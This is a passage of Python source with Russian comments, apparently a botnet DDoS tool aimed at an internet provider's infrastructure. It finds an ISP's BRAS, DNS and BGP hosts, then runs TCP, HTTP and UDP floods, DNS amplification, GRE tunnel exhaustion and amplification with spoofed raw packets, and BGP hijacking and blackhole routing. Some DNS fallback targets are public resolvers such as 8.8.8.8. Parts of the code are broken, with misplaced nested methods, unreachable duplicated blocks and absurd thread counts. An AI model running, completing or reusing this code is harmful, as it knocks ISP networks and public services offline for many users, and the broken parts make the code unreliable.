        total_time = time.time() - attack_stats['start_time']
        
        print(f"\n{'='*60}")
        print("💀 ИТОГИ КОМПЛЕКСНОЙ АТАКИ НА ИНФРАСТРУКТУРУ ПРОВАЙДЕРА")
        print(f"{'='*60}")
        print(f"🎯 Всего целей: {attack_stats['total_targets']}")
        print(f"✅ Успешных атак: {attack_stats['successful_attacks']}")
        print(f"❌ Неудачных атак: {attack_stats['failed_attacks']}")
        print(f"⏱️ Общее время: {total_time:.2f} секунд")
        
        if attack_stats['total_targets'] > 0:
            efficiency = (attack_stats['successful_attacks'] / attack_stats['total_targets']) * 100
            print(f"🏆 Эффективность: {efficiency:.1f}%")
        
        return attack_stats['successful_attacks'] > 0

    def isp_target_discovery(self, target_ip):
        """
        Обнаружение критической инфраструктуры провайдера по IP
        """
        print(f"🔍 Анализ инфраструктуры провайдера для IP: {target_ip}")
        
        isp_info = {
            'bras_servers': [],
            'dns_servers': [],
            'pppoe_servers': [],
            'bgp_routers': [],
            'network_blocks': [],
            'other_critical': []
        }
        
        try:
            # 1. WHOIS информация о IP
            print("📊 Получение WHOIS информации...")
            try:
                whois_info = whois.whois(target_ip)
                
                if whois_info:
                    # Извлекаем сетевые блоки провайдера
                    if hasattr(whois_info, 'nets') and whois_info.nets:
                        for net in whois_info.nets:
                            if hasattr(net, 'cidr'):
                                isp_info['network_blocks'].append(str(net.cidr))
                                print(f"✅ Найден сетевой блок: {net.cidr}")
                    
                    # Пытаемся извлечь имя провайдера
                    provider_name = ""
                    if whois_info.org:
                        provider_name = whois_info.org
                    elif whois_info.asn:
                        provider_name = f"AS{whois_info.asn}"
                    
                    if provider_name:
                        print(f"🏢 Провайдер: {provider_name}")
            except Exception as e:
                print(f"⚠️ Ошибка WHOIS: {e}")
            
            # 2. Поиск DNS серверов провайдера
            isp_info['dns_servers'].extend(self._find_isp_dns_servers(target_ip))
            
            # 3. Поиск BRAS серверов - ИСПРАВЛЕННЫЙ ВЫЗОВ
            isp_info['bras_servers'].extend(self._find_bras_servers(target_ip))
            
            # 4. Поиск PPPoE серверов
            isp_info['pppoe_servers'].extend(self._find_pppoe_servers(target_ip))
            
            # 5. Поиск BGP маршрутизаторов - ТАКЖЕ НУЖНО ИСПРАВИТЬ
            isp_info['bgp_routers'].extend(self._find_bgp_routers(target_ip))
            
        except Exception as e:
            print(f"❌ Ошибка анализа провайдера: {e}")
        
        # Вывод результатов
        self._print_isp_discovery_results(isp_info)
        return isp_info

    def _fallback_attack(self, target_ip, duration):
        """Резервная атака если не найдена инфраструктура"""
        print("🔄 Запуск резервной атаки...")
        
        attacks = [
            lambda: self.tcp_connection_flood(target_ip, 80, duration//3),
            lambda: self.http_get_flood(target_ip, 443, False, duration//3),
            lambda: self.udp_flood_attack(target_ip, 53, duration//3)
        ]
        
        total_impact = 0
        for attack in attacks:
            try:
                impact = attack()
                total_impact += impact if impact else 0
            except Exception as e:
                print(f"❌ Ошибка резервной атаки: {e}")
                continue
        
        return total_impact
        
        def attack_single_target(target_info):
            """Атака одной цели"""
            target_type, target_ip, target_port = target_info
            
            try:
                print(f"💥 Атакуем {target_type} {target_ip}:{target_port}")
                
                # Выбор метода атаки в зависимости от типа цели
                if target_type == 'DNS':
                    # DNS amplification атака
                    return self.dns_amplification_attack(target_ip, target_port, duration//2)
                elif target_type == 'BGP':
                    # TCP flood на BGP порт
                    return self.tcp_connection_flood(target_ip, target_port, duration//3)
                else:
                    # Комбинированная атака для остальных целей
                    attacks = [
                        lambda: self.tcp_connection_flood(target_ip, target_port, duration//5),
                        lambda: self.http_get_flood(target_ip, target_port, False, duration//5),
                        lambda: self.udp_flood_attack(target_ip, target_port, duration//5)
                    ]
                    
                    total_impact = 0
                    for attack in attacks:
                        try:
                            impact = attack()
                            total_impact += impact if impact else 0
                        except:
                            continue
                    
                    return total_impact
                
            except Exception as e:
                print(f"❌ Ошибка атаки {target_ip}:{target_port}: {e}")
                return 0
        
        # Запуск атак на все цели параллельно
        with ThreadPoolExecutor(max_workers=min(len(all_targets), self.max_threads)) as executor:
            futures = [executor.submit(attack_single_target, target) for target in all_targets]
            
            for future in futures:
                try:
                    result = future.result(timeout=duration + 30)
                    if result > 0:
                        attack_stats['successful_attacks'] += 1
                    else:
                        attack_stats['failed_attacks'] += 1
                except:
                    attack_stats['failed_attacks'] += 1
        
        # 4. Финальная статистика
        total_time = time.time() - attack_stats['start_time']
        
        print(f"\n{'='*60}")
        print("💀 ИТОГИ КОМПЛЕКСНОЙ АТАКИ НА ИНФРАСТРУКТУРУ ПРОВАЙДЕРА")
        print(f"{'='*60}")
        print(f"🎯 Всего целей: {attack_stats['total_targets']}")
        print(f"✅ Успешных атак: {attack_stats['successful_attacks']}")
        print(f"❌ Неудачных атак: {attack_stats['failed_attacks']}")
        print(f"⏱️ Общее время: {total_time:.2f} секунд")
        print(f"🏆 Эффективность: {(attack_stats['successful_attacks']/attack_stats['total_targets']*100):.1f}%")
        
        return attack_stats['successful_attacks'] > 0

    def bras_attack(self, target_ip, duration=60):
        """Специализированная атака на BRAS серверы"""
        print(f"🎯 Запуск специализированной атаки на BRAS серверы")
        
        # Обнаружение BRAS серверов
        isp_info = self.isp_target_discovery(target_ip)
        bras_servers = isp_info.get('bras_servers', [])
        
        if not bras_servers:
            print("❌ BRAS серверы не найдены! Используем стандартные порты BRAS")
            bras_servers = [target_ip]
        
        attack_results = []
        bras_ports = [2000, 2001, 2002, 3000, 3001, 8000, 8080, 8443]
        
        # Проверяем доступность портов перед атакой
        valid_targets = []
        for bras_ip in bras_servers:
            for port in bras_ports:
                if self._check_port_availability(bras_ip, port):
                    valid_targets.append((bras_ip, port))
                    print(f"✅ Найден активный BRAS порт: {bras_ip}:{port}")
        
        if not valid_targets:
            print("❌ Нет доступных BRAS портов для атаки!")
            return 0
        
        # Запускаем атаку на все валидные цели
        for bras_ip, port in valid_targets:
            print(f"💥 Атака BRAS {bras_ip}:{port}")
            
            # Комбинированная атака на BRAS
            results = []
            
            # TCP Connection Flood (основная атака)
            results.append(self.tcp_connection_flood(bras_ip, port, duration//2))
            
            # HTTP Flood (если порт 80/8080/8443)
            if port in [80, 8080, 8443]:
                use_https = port == 8443
                results.append(self.http_get_flood(bras_ip, port, use_https, duration//3))
            
            # UDP Flood (для специфичных портов)
            if port in [2000, 2001, 2002]:
                results.append(self.udp_flood_attack(bras_ip, port, duration//3))
            
            attack_results.extend([r for r in results if r])
        
        return sum(attack_results)

    def _check_port_availability(self, ip, port, timeout=2):
        """Проверяет доступность порта"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def dns_infrastructure_attack(self, target_ip, duration=60):
        """Атака на DNS инфраструктуру провайдера"""
        print(f"🎯 Запуск атаки на DNS инфраструктуру")
        
        isp_info = self.isp_target_discovery(target_ip)
        dns_servers = isp_info.get('dns_servers', [])
        
        if not dns_servers:
            print("❌ DNS серверы не найдены! Используем стандартные DNS")
            dns_servers = ['8.8.8.8', '1.1.1.1']  # Fallback
        
        attack_results = []
        
        for dns_ip in dns_servers:
            print(f"💥 Атака DNS сервера {dns_ip}")
            # Комбинированная атака на DNS
            results = [
                self.dns_amplification_attack(dns_ip, 53, duration//2),
                self.dns_water_torture_attack(dns_ip, 53, duration//2),
                self.udp_flood_attack(dns_ip, 53, duration//3)
            ]
            attack_results.extend([r for r in results if r])
        
        return sum(attack_results)

    # Добавляем вспомогательный метод для фрагментации
    def _create_ip_header_with_fragmentation(self, source_ip, dest_ip, data_length, protocol, 
                                           identification, fragment_offset, more_fragments):
        """Создает IP header с поддержкой фрагментации"""
        version_ihl = 0x45  # IPv4, IHL=5
        tos = 0
        total_length = 20 + data_length
        flags_fragment = (more_fragments << 13) | fragment_offset
        ttl = 255
        ip_checksum = 0
        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)
        
        # IP header без checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              flags_fragment, ttl, protocol, ip_checksum,
                              source_addr, dest_addr)
        
        # Вычисляем checksum
        ip_checksum = self._calculate_checksum(ip_header)
        
        # Пересобираем с checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              flags_fragment, ttl, protocol, ip_checksum,
                              source_addr, dest_addr)
        
        return ip_header

    def gre_tunnel_exhaustion(self, target_ip, duration=60):
        """
        GRE Tunnel Exhaustion атака
        - Создание множества GRE туннелей для истощения ресурсов
        - Атака на GRE endpoint'ы провайдера
        - Переполнение таблиц туннелей
        - Использование различных GRE версий и протоколов
        """
        print(f"🔄 Запуск GRE Tunnel Exhaustion атаки на {target_ip}")
        
        if not self.raw_socket_available:
            print("❌ Требуются права root для GRE атаки!")
            return None
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return None
        
        attack_stats = {
            'gre_packets_sent': 0,
            'tunnels_created': 0,
            'gre_versions_used': {'v0': 0, 'v1': 0},
            'protocols_used': {'ip': 0, 'ppp': 0, 'mpls': 0},
            'total_bytes': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_gre_packet(source_ip, dest_ip, gre_version=0, protocol=0x0800):
            """
            Создает GRE пакет
            GRE version: 0 (стандартный) или 1 (PPTP)
            Protocol: 0x0800 (IPv4), 0x880B (PPP), 0x8847 (MPLS)
            """
            # GRE header
            flags = 0
            version = gre_version
            
            if gre_version == 0:
                # Standard GRE
                gre_header = struct.pack('!HHH', 
                                       (flags << 13) | (version & 0x7),  # Flags and version
                                       protocol,  # Protocol type
                                       0)  # Checksum (optional)
            else:
                # GRE v1 (PPTP)
                gre_header = struct.pack('!HHHH', 
                                       (flags << 13) | (version & 0x7) | 0x1000,  # Flags + version + key
                                       protocol,  # Protocol type
                                       0,  # Payload length
                                       0)  # Call ID (Key)
            
            # Encapsulated payload (поддельный IP пакет)
            inner_ip = self._create_inner_ip_packet(source_ip, dest_ip)
            
            # Outer IP header (для GRE)
            outer_ip = self._create_ip_header_simple(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data_length=len(gre_header) + len(inner_ip),
                protocol=47  # GRE protocol
            )
            
            return outer_ip + gre_header + inner_ip

        def _create_inner_ip_packet(self, source_ip, dest_ip):
            """Создает внутренний IP пакет для инкапсуляции в GRE"""
            # Создаем ICMP пакет как payload
            icmp_packet = self._create_icmp_echo_request()
            
            inner_ip = self._create_ip_header_simple(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data_length=len(icmp_packet),
                protocol=socket.IPPROTO_ICMP
            )
            
            return inner_ip + icmp_packet

        def create_gre_tunnel_establishment(source_ip, dest_ip, tunnel_type="ipip"):
            """Создает пакеты для установки GRE туннеля"""
            packets = []
            
            if tunnel_type == "ipip":
                # IP-in-IP туннель (упрощенный GRE)
                inner_ip = self._create_inner_ip_packet(source_ip, "8.8.8.8")
                outer_ip = self._create_ip_header_simple(
                    source_ip=source_ip,
                    dest_ip=dest_ip,
                    data_length=len(inner_ip),
                    protocol=4  # IP-in-IP protocol
                )
                packets.append(outer_ip + inner_ip)
                
            elif tunnel_type == "gre_standard":
                # Стандартный GRE туннель
                packets.append(create_gre_packet(source_ip, dest_ip, gre_version=0, protocol=0x0800))
                
            elif tunnel_type == "gre_pptp":
                # PPTP GRE туннель
                packets.append(create_gre_packet(source_ip, dest_ip, gre_version=1, protocol=0x880B))
                
            elif tunnel_type == "gre_mpls":
                # MPLS over GRE
                packets.append(create_gre_packet(source_ip, dest_ip, gre_version=0, protocol=0x8847))
            
            return packets

        def gre_tunnel_attack(device):
            gre_packets = 0
            tunnels_created = 0
            bytes_sent = 0
            
            try:
                print(f"🔄 {device.ip} начинает GRE Tunnel Exhaustion атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Список возможных типов туннелей
                tunnel_types = ["ipip", "gre_standard", "gre_pptp", "gre_mpls"]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем несколько туннелей за один цикл
                        for _ in range(random.randint(1, 5)):
                            tunnel_type = random.choice(tunnel_types)
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            
                            tunnel_packets = create_gre_tunnel_establishment(source_ip, target_ip, tunnel_type)
                            
                            for packet in tunnel_packets:
                                sock.sendto(packet, (target_ip, 0))
                                gre_packets += 1
                                bytes_sent += len(packet)
                                
                                attack_stats['gre_packets_sent'] += 1
                                attack_stats['total_bytes'] += len(packet)
                                
                                # Статистика по версиям и протоколам
                                if "ipip" in tunnel_type:
                                    attack_stats['protocols_used']['ip'] += 1
                                elif "pptp" in tunnel_type:
                                    attack_stats['gre_versions_used']['v1'] += 1
                                    attack_stats['protocols_used']['ppp'] += 1
                                elif "mpls" in tunnel_type:
                                    attack_stats['protocols_used']['mpls'] += 1
                                else:
                                    attack_stats['gre_versions_used']['v0'] += 1
                                    attack_stats['protocols_used']['ip'] += 1
                        
                        tunnels_created += 1
                        attack_stats['tunnels_created'] += 1
                        
                        # Создаем дополнительные GRE пакеты для существующих туннелей
                        for _ in range(random.randint(3, 10)):
                            gre_version = random.choice([0, 1])
                            protocol = random.choice([0x0800, 0x880B, 0x8847])
                            
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            gre_packet = create_gre_packet(source_ip, target_ip, gre_version, protocol)
                            
                            sock.sendto(gre_packet, (target_ip, 0))
                            gre_packets += 1
                            bytes_sent += len(gre_packet)
                            
                            attack_stats['gre_packets_sent'] += 1
                            attack_stats['total_bytes'] += len(gre_packet)
                        
                        time.sleep(0.1)  # Контролируемая скорость
                        
                    except Exception as e:
                        continue
                
                sock.close()
                print(f"✅ {device.ip}: {gre_packets} GRE пакетов, {tunnels_created} туннелей")
                return gre_packets, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        def advanced_gre_flood(device):
            """Продвинутая GRE атака с различными векторами"""
            packets_sent = 0
            bytes_sent = 0
            
            try:
                print(f"🔥 {device.ip} начинает продвинутую GRE атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        attack_type = random.choice([
                            'gre_flood', 
                            'tunnel_exhaustion', 
                            'fragmented_gre',
                            'malformed_gre'
                        ])
                        
                        if attack_type == 'gre_flood':
                            # Массовая отправка GRE пакетов
                            for _ in range(10):
                                source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                                gre_packet = create_gre_packet(source_ip, target_ip)
                                sock.sendto(gre_packet, (target_ip, 0))
                                packets_sent += 1
                                bytes_sent += len(gre_packet)
                        
                        elif attack_type == 'tunnel_exhaustion':
                            # Создание множества туннелей
                            for i in range(5):
                                source_ip = f"10.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 254)}"
                                tunnel_packets = create_gre_tunnel_establishment(
                                    source_ip, target_ip, random.choice(["gre_standard", "gre_pptp"])
                                )
                                for packet in tunnel_packets:
                                    sock.sendto(packet, (target_ip, 0))
                                    packets_sent += 1
                                    bytes_sent += len(packet)
                        
                        elif attack_type == 'fragmented_gre':
                            # Фрагментированные GRE пакеты
                            large_payload = b'G' * 5000
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            
                            # Создаем большой GRE пакет
                            gre_header = struct.pack('!HHH', 0, 0x0800, 0)
                            inner_ip = self._create_inner_ip_packet(source_ip, "8.8.8.8")
                            large_gre_packet = gre_header + inner_ip + large_payload
                            
                            # Фрагментируем
                            fragments = self._create_ip_fragments(
                                source_ip, target_ip, large_gre_packet, 500
                            )
                            
                            for fragment in fragments[:3]:
                                sock.sendto(fragment, (target_ip, 0))
                                packets_sent += 1
                                bytes_sent += len(fragment)
                        
                        else:  # malformed_gre
                            # Неправильно сформированные GRE пакеты
                            malformed_gre = self._create_malformed_gre_packet(target_ip)
                            for packet in malformed_gre:
                                sock.sendto(packet, (target_ip, 0))
                                packets_sent += 1
                                bytes_sent += len(packet)
                        
                        attack_stats['gre_packets_sent'] += packets_sent
                        attack_stats['total_bytes'] += bytes_sent
                        attack_stats['tunnels_created'] += 1
                        
                        time.sleep(0.05)
                        
                    except Exception as e:
                        continue
                
                sock.close()
                print(f"✅ {device.ip}: {packets_sent} продвинутых GRE пакетов")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        def _create_malformed_gre_packet(self, dest_ip):
            """Создает неправильно сформированные GRE пакеты"""
            packets = []
            
            # 1. GRE с неправильной версией
            malformed_version = struct.pack('!HHH', 0xE000, 0x0800, 0)  # Версия 7 (несуществующая)
            inner_ip = self._create_inner_ip_packet("1.1.1.1", dest_ip)
            outer_ip = self._create_ip_header_simple("1.1.1.1", dest_ip, len(malformed_version) + len(inner_ip), 47)
            packets.append(outer_ip + malformed_version + inner_ip)
            
            # 2. GRE с неправильным протоколом
            wrong_protocol = struct.pack('!HHH', 0, 0xDEAD, 0)  # Неизвестный протокол
            packets.append(outer_ip + wrong_protocol + inner_ip)
            
            # 3. GRE без payload
            empty_gre = struct.pack('!HHH', 0, 0x0800, 0)
            outer_ip_empty = self._create_ip_header_simple("2.2.2.2", dest_ip, len(empty_gre), 47)
            packets.append(outer_ip_empty + empty_gre)
            
            return packets

        # Запускаем обе версии атаки параллельно
        import threading
        
        def run_basic_gre():
            basic_results = self._run_attack(iot_bots[:len(iot_bots)//2], attack_stats, 
                                           gre_tunnel_attack, "GRE Basic", 
                                           max_workers=min(len(iot_bots)//2, 5000000000))
            return basic_results
        
        def run_advanced_gre():
            advanced_results = self._run_attack(iot_bots[len(iot_bots)//2:], attack_stats,
                                              advanced_gre_flood, "GRE Advanced",
                                              max_workers=min(len(iot_bots)//2, 5000000000))
            return advanced_results
        
        # Запуск в отдельных потоках
        basic_thread = threading.Thread(target=run_basic_gre)
        advanced_thread = threading.Thread(target=run_advanced_gre)
        
        basic_thread.daemon = True
        advanced_thread.daemon = True
        
        basic_thread.start()
        advanced_thread.start()
        
        # Ожидаем завершения
        basic_thread.join(timeout=duration + 10)
        advanced_thread.join(timeout=duration + 10)
        
        # Вывод детальной статистики
        print(f"\n🔄 GRE TUNNEL EXHAUSTION РЕЗУЛЬТАТЫ:")
        print(f"📦 GRE пакетов отправлено: {attack_stats['gre_packets_sent']}")
        print(f"🔄 Туннелей создано: {attack_stats['tunnels_created']}")
        print(f"💾 Всего данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        
        print(f"\n🎯 Статистика по версиям GRE:")
        for version, count in attack_stats['gre_versions_used'].items():
            if count > 0:
                print(f"   - GRE v{version}: {count} пакетов")
        
        print(f"\n🔧 Статистика по протоколам:")
        for protocol, count in attack_stats['protocols_used'].items():
            if count > 0:
                protocol_name = {
                    'ip': 'IPv4',
                    'ppp': 'PPP', 
                    'mpls': 'MPLS'
                }.get(protocol, protocol)
                print(f"   - {protocol_name}: {count} пакетов")
        
        return attack_stats['gre_packets_sent']

    def gre_amplification_attack(self, target_ip, duration=60):
        """
        GRE Amplification атака
        - Использование GRE для amplification
        - Большие encapsulated payloads
        - Отражение через GRE туннели
        """
        print(f"💥 Запуск GRE Amplification атаки на {target_ip}")
        
        if not self.raw_socket_available:
            print("❌ Требуются права root для GRE amplification атаки!")
            return None
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return None
        
        attack_stats = {
            'amplification_packets': 0,
            'estimated_amplified_bytes': 0,
            'total_bytes_sent': 0,
            'amplification_factor': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_gre_amplification_packet(source_ip, dest_ip, amplification_size=5000):
            """Создает GRE пакет с большим payload для amplification"""
            # GRE header
            gre_header = struct.pack('!HHH', 0, 0x0800, 0)
            
            # Большой encapsulated payload
            large_payload = b'A' * amplification_size
            
            # Внутренний IP пакет с большим payload
            inner_ip = self._create_ip_header_simple(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data_length=len(large_payload),
                protocol=socket.IPPROTO_UDP
            )
            
            # UDP header для внутреннего пакета
            udp_header = struct.pack('!HHHH', 
                                   random.randint(1024, 65535),
                                   random.randint(1, 65535),
                                   8 + len(large_payload), 0)
            
            full_inner_packet = inner_ip + udp_header + large_payload
            
            # Outer IP header для GRE
            outer_ip = self._create_ip_header_simple(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data_length=len(gre_header) + len(full_inner_packet),
                protocol=47  # GRE
            )
            
            return outer_ip + gre_header + full_inner_packet

        def gre_amplification_attack(device):
            packets_sent = 0
            bytes_sent = 0
            amplified_bytes = 0
            
            try:
                print(f"💥 {device.ip} начинает GRE Amplification атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем amplification пакеты разного размера
                        amplification_sizes = [1000, 2000, 5000, 8000, 10000]
                        
                        for size in amplification_sizes[:2]:  # Ограничиваем количество размеров
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            gre_packet = create_gre_amplification_packet(source_ip, target_ip, size)
                            
                            sock.sendto(gre_packet, (target_ip, 0))
                            
                            packets_sent += 1
                            bytes_sent += len(gre_packet)
                            amplified_bytes += size * 2  # Оценка amplification factor
                            
                            attack_stats['amplification_packets'] += 1
                            attack_stats['total_bytes_sent'] += len(gre_packet)
                            attack_stats['estimated_amplified_bytes'] += size * 2
                        
                        time.sleep(0.2)  # Медленнее для amplification
                        
                    except Exception as e:
                        continue
                
                sock.close()
                
                # Расчет amplification factor
                if bytes_sent > 0:
                    amplification_factor = amplified_bytes / bytes_sent
                    attack_stats['amplification_factor'] = max(attack_stats['amplification_factor'], amplification_factor)
                
                print(f"✅ {device.ip}: {packets_sent} amplification пакетов, фактор: {amplification_factor:.1f}x")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(iot_bots, attack_stats, gre_amplification_attack,
                                  "GRE Amplification", max_workers=min(len(iot_bots), 5000000000))
        
        print(f"\n💥 GRE AMPLIFICATION РЕЗУЛЬТАТЫ:")
        print(f"📦 Amplification пакетов: {attack_stats['amplification_packets']}")
        print(f"📤 Отправлено данных: {attack_stats['total_bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"💥 Оценка усиленного трафика: {attack_stats['estimated_amplified_bytes'] / 1024 / 1024:.2f} MB")
        print(f"🎯 Максимальный коэффициент усиления: {attack_stats['amplification_factor']:.1f}x")
        
        return results

    def bgp_hijacking_blackhole_routing(self, target_asn, target_prefixes, duration=60):
        """
        BGP Hijacking + Blackhole Routing атака
        - Эмуляция BGP анонсов для перехвата трафика
        - Создание blackhole маршрутов
        - Атака на BGP сессии соседей
        """
        print(f"🎯 Запуск BGP Hijacking + Blackhole Routing атаки на AS{target_asn}")
        
        if not self.raw_socket_available:
            print("❌ Требуются права root для BGP атаки!")
            return None
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return None
        
        attack_stats = {
            'bgp_announcements': 0,
            'blackhole_routes': 0,
            'bgp_session_attacks': 0,
            'total_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_bgp_update_message(origin_as, target_prefix, nexthop="0.0.0.0"):
            """Создает BGP UPDATE сообщение для hijacking"""
            # BGP header
            marker = b'\xff' * 16
            length = 19  # Minimum BGP update length
            type_bgp = 2  # UPDATE message
            
            # Withdrawn Routes (empty)
            withdrawn_len = struct.pack('!H', 0)
            
            # Path Attributes
            origin_attr = struct.pack('!BBBB', 0x40, 1, 1, 0)  # ORIGIN: IGP
            as_path_attr = struct.pack('!BBB', 0x40, 2, 4)  # AS_PATH
            as_path_attr += struct.pack('!BBH', 2, 1, origin_as)  # AS sequence
            
            nexthop_attr = struct.pack('!BBBB', 0x40, 3, 4)  # NEXT_HOP
            nexthop_attr += socket.inet_aton(nexthop)
            
            # NLRI (Network Layer Reachability Information)
            nlri = self._ip_prefix_to_nlri(target_prefix)
            
            # Calculate total length
            path_attrs = origin_attr + as_path_attr + nexthop_attr
            path_attrs_len = struct.pack('!H', len(path_attrs))
            
            bgp_message = (marker + struct.pack('!HB', length + len(path_attrs) + len(nlri), type_bgp) +
                         withdrawn_len + path_attrs_len + path_attrs + nlri)
            
            return bgp_message

        def bgp_hijacking_attack(device):
            announcements_sent = 0
            blackhole_routes_created = 0
            bgp_sessions_attacked = 0
            
            try:
                print(f"🎯 {device.ip} начинает BGP Hijacking атаку...")
                start_time = time.time()
                
                # Создаем raw socket для BGP (порт 179)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Список BGP соседей для атаки
                bgp_neighbors = [
                    "1.1.1.1", "8.8.8.8", "9.9.9.9",  # Public resolvers
                    "208.67.222.222", "208.67.220.220",  # OpenDNS
                ]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 1. BGP Hijacking - анонсируем чужие префиксы
                        for prefix in target_prefixes[:3]:  # Ограничиваем количество префиксов
                            # Создаем malicious BGP UPDATE
                            bgp_message = create_bgp_update_message(
                                origin_as=random.randint(1000, 50000),
                                target_prefix=prefix,
                                nexthop=device.ip  # Наш IP как next-hop
                            )
                            
                            # Отправляем BGP соседям
                            for neighbor in bgp_neighbors[:2]:  # Ограничиваем количество соседей
                                ip_packet = self._create_ip_header_simple(
                                    source_ip=device.ip,
                                    dest_ip=neighbor,
                                    data_length=len(bgp_message),
                                    protocol=socket.IPPROTO_TCP
                                )
                                
                                # TCP header для BGP (порт 179)
                                tcp_header = self._create_tcp_header(
                                    source_ip=device.ip,
                                    source_port=random.randint(1024, 65535),
                                    dest_ip=neighbor,
                                    dest_port=179,
                                    flags=0x18,  # PSH+ACK
                                    seq=random.randint(0, 0xFFFFFFFF),
                                    ack=random.randint(0, 0xFFFFFFFF)
                                )
                                
                                full_packet = ip_packet + tcp_header + bgp_message
                                sock.sendto(full_packet, (neighbor, 0))
                                
                                announcements_sent += 1
                                attack_stats['bgp_announcements'] += 1
                        
                        # 2. Blackhole Routing - анонсируем null route
                        blackhole_prefix = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.0/24"
                        blackhole_message = create_bgp_update_message(
                            origin_as=target_asn,
                            target_prefix=blackhole_prefix,
                            nexthop="0.0.0.0"  # Blackhole
                        )
                        
                        for neighbor in bgp_neighbors[:1]:
                            ip_packet = self._create_ip_header_simple(
                                source_ip=device.ip,
                                dest_ip=neighbor,
                                data_length=len(blackhole_message),
                                protocol=socket.IPPROTO_TCP
                            )
                            
                            tcp_header = self._create_tcp_header(
                                source_ip=device.ip,
                                source_port=random.randint(1024, 65535),
                                dest_ip=neighbor,
                                dest_port=179,
                                flags=0x18,
                                seq=random.randint(0, 0xFFFFFFFF),
                                ack=random.randint(0, 0xFFFFFFFF)
                            )
                            
                            full_packet = ip_packet + tcp_header + blackhole_message
                            sock.sendto(full_packet, (neighbor, 0))
                            
                            blackhole_routes_created += 1
                            attack_stats['blackhole_routes'] += 1
                        
                        # 3. BGP Session Exhaustion - множество TCP SYN к BGP порту
                        for _ in range(5):
                            target_ip = random.choice(bgp_neighbors)
                            syn_packet = self._create_syn_packet(
                                source_ip=".".join(str(random.randint(1, 254)) for _ in range(4)),
                                source_port=random.randint(1024, 65535),
                                dest_ip=target_ip,
                                dest_port=179
                            )
                            sock.sendto(syn_packet, (target_ip, 0))
                            bgp_sessions_attacked += 1
                            attack_stats['bgp_session_attacks'] += 1
                        
                        attack_stats['total_packets'] += 1
                        time.sleep(0.5)  # BGP требует более медленного темпа
                        
                    except Exception as e:
                        continue
                
                sock.close()
                print(f"✅ {device.ip}: {announcements_sent} BGP анонсов, {blackhole_routes_created} blackhole маршрутов")
                return announcements_sent, blackhole_routes_created
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(iot_bots, attack_stats, bgp_hijacking_attack, 
                                  "BGP Hijacking", max_workers=min(len(iot_bots), 5000000000))
        
        print(f"\n🎯 BGP HIJACKING РЕЗУЛЬТАТЫ:")
        print(f"📢 BGP анонсов: {attack_stats['bgp_announcements']}")
        print(f"🕳️ Blackhole маршрутов: {attack_stats['blackhole_routes']}")
        print(f"🔗 Атаковано BGP сессий: {attack_stats['bgp_session_attacks']}")
        
        return results

    def _ip_prefix_to_nlri(self, prefix):
        """Конвертирует IP префикс в BGP NLRI формат"""
        ip, mask = prefix.split('/')
        mask_len = int(mask)
        
        # Конвертируем IP в bytes
        ip_bytes = socket.inet_aton(ip)
        
        # Количество байт для NLRI
        byte_count = (mask_len + 7) // 8
        
        # NLRI: [length] [prefix bytes]
        nlri = struct.pack('!B', mask_len) + ip_bytes[:byte_count]
        
        return nlri

    def advanced_state_table_exhaustion(self, target_ip, target_port=0, duration=60):
        """
        Advanced State-Table Exhaustion атака
        - Истощение таблиц состояний firewall/роутера
        - Создание псевдо-сессий с разными протоколами
